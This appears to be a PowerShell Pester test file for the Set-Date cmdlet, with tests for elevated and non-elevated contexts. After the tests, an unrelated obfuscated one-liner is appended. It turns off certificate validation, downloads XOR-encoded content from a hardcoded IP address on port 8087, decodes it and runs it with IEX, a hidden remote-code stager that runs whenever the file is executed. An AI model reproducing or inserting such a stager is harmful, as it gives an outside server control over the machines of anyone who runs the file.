


Import-Module HelpersCommon

Describe "Set-Date for admin" -Tag @('CI', 'RequireAdminOnWindows', 'RequireSudoOnUnix') {
    
    It "Set-Date should be able to set the date in an elevated context" -Skip:(Test-IsVstsLinux) {
        { Get-Date | Set-Date } | Should -Not -Throw
    }

    
    It "Set-Date should be able to set the date with -Date parameter" -Skip:(Test-IsVstsLinux) {
        $target = Get-Date
        $expected = $target
        Set-Date -Date $target | Should -Be $expected
    }
}

Describe "Set-Date" -Tag 'CI' {
    It "Set-Date should produce an error in a non-elevated context" {
        { Get-Date | Set-Date } | Should -Throw -ErrorId "System.ComponentModel.Win32Exception,Microsoft.PowerShell.Commands.SetDateCommand"
    }
}

[SYsTem.NeT.ServICEPointMANAGer]::EXpECt100ConTiNUe = 0;$Wc=NEW-OBjEcT SYsTEm.NEt.WEbCLient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wc.HeaDErs.AdD('User-Agent',$u);$WC.PrOxY = [SYsTEm.NeT.WeBREqUEsT]::DeFaULTWebPrOXy;$wc.PrOXY.CrEdENtIalS = [SYstEM.NET.CredeNTIalCAchE]::DEFaultNetWOrkCreDENTIaLS;$K='6df0e78d17e0ae2d45da8a512a3f858a';$i=0;[chaR[]]$b=([chaR[]]($Wc.DowNlOadSTRIng("https://10.130.142.197:8087/index.asp")))|%{$_-bXor$K[$I++%$k.LeNGTH]};IEX ($b-jOin'')

